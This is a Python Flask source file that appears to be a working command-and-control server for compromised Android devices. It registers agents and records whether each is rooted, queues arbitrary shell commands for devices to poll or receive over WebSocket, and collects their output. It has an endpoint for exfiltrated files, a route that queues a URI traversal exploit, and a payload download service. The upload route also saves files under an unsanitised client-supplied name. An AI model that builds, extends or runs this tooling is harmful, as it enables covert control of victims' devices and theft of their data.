import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, abort, send_file, render_template
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import os
import time
from token_utils import verify_signature, register_token, get_device_token, rotate_token

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# In-memory command queue for demo (replace with DB in production)
device_commands = {}
device_outputs = {}
connected_agents = {}
agent_sockets = {}

# === Auth Middleware (disabled temporarily for dev/testing) ===
@app.before_request
def check_auth():
    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
        agent_id = request.headers.get("X-Agent-ID")
        sig = request.headers.get("X-Signature")
        if not agent_id or not sig or not verify_signature(sig, agent_id):
            abort(403)

# === Web Dashboard ===
@app.route("/")
def dashboard():
    return render_template("index.html")

# === Agent Registration ===
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    token = register_token(device_id)
    info = {
        "manufacturer": data.get("manufacturer", "unknown"),
        "model": data.get("model", "unknown"),
        "rooted": data.get("rooted", "unknown"),
        "last_seen": time.time()
    }
    connected_agents[device_id] = info
    device_commands[device_id] = "id"
    print(f"[+] Registered Agent: {device_id} {info}")
    return jsonify({"status": "registered", "token": token})

# === Token Management ===
@app.route("/token/<device_id>", methods=["GET"])
def get_token_for_device(device_id):
    token = get_device_token(device_id)
    if token:
        return jsonify({"device_id": device_id, "token": token})
    return jsonify({"error": "Token not found"}), 404

@app.route("/token/rotate/<device_id>", methods=["POST"])
def rotate_token_for_device(device_id):
    new_token = rotate_token(device_id)
    return jsonify({"device_id": device_id, "new_token": new_token})

# === View All Registered Agents ===
@app.route("/agents", methods=["GET"])
def list_agents():
    now = time.time()
    agents = []
    for device_id, meta in connected_agents.items():
        meta_copy = meta.copy()
        meta_copy["device_id"] = device_id
        meta_copy["online"] = (now - meta["last_seen"]) < 60
        agents.append(meta_copy)
    return jsonify(agents)

# === Poll-based C2 commands ===
@app.route("/get_command/<device_id>", methods=["GET"])
def get_command(device_id):
    cmd = device_commands.get(device_id, "")
    connected_agents[device_id]["last_seen"] = time.time()
    print(f"[>] Sending command to {device_id}: {cmd}")
    return jsonify({"cmd": cmd})

@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    device_outputs[device_id] = output
    connected_agents[device_id]["last_seen"] = time.time()
    print(f"[<] Output from {device_id}:\n{output}")
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    device_commands[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

# === File exfil endpoint ===
@app.route("/exfil", methods=["POST"])
def receive_file():
    content = request.data.decode()
    print(f"\n[EXFIL] Received file data:\n{content}\n")
    return jsonify({"status": "received"})

# === Exploits (e.g., URI Traversal) ===
@app.route("/exploit/uri_traversal", methods=["POST"])
def uri_traversal():
    data = request.json
    package = data.get("package")
    component = data.get("component") 
    from modules import exploit_uri_traversal
    command = exploit_uri_traversal.generate_command(package, component)
    device_id = data.get("device_id")
    device_commands[device_id] = command
    return jsonify({"status": "queued", "command": command})

# === Payload Downloader ===
@app.route("/payloads/<filename>", methods=["GET"])
def get_payload(filename):
    payload_path = os.path.join("payloads", filename)
    if not os.path.exists(payload_path):
        return {"error": "File not found"}, 404
    return send_file(payload_path, mimetype="application/octet-stream")

# === File Upload to Server ===
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    os.makedirs("uploads", exist_ok=True)
    file.save(os.path.join("uploads", file.filename))
    return jsonify({"status": "ok"})

# === WebSocket Event Handling ===
@socketio.on('connect')
def on_connect():
    print("[✓] Agent connected via WebSocket")

@socketio.on('disconnect')
def on_disconnect():
    # Optional: cleanup logic or print info
    print(f"[!] A client disconnected")

@socketio.on('command_result')
def on_command_result(data):
    print(f"[<] Result: {data}")

@socketio.on('register')
def register_agent(data):
    device_id = data.get("device_id")
    manufacturer = data.get("manufacturer", "Unknown")
    is_root = data.get("rooted", False)
    connected_agents[device_id] = {
        "manufacturer": manufacturer,
        "model": data.get("model", "Unknown"),
        "rooted": is_root,
        "last_seen": time.time()
    }
    agent_sockets[device_id] = request.sid
    emit('agent_list', connected_agents, broadcast=True)

@socketio.on('send_command')
def send_command(data):
    device_id = data.get("device_id")
    command = data.get("command")
    if device_id and command:
        device_commands[device_id] = command
        sid = agent_sockets.get(device_id)
        if sid:
            emit('command', {'cmd': command}, to=sid)
        print(f"[>] Sent to {device_id}: {command}")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)
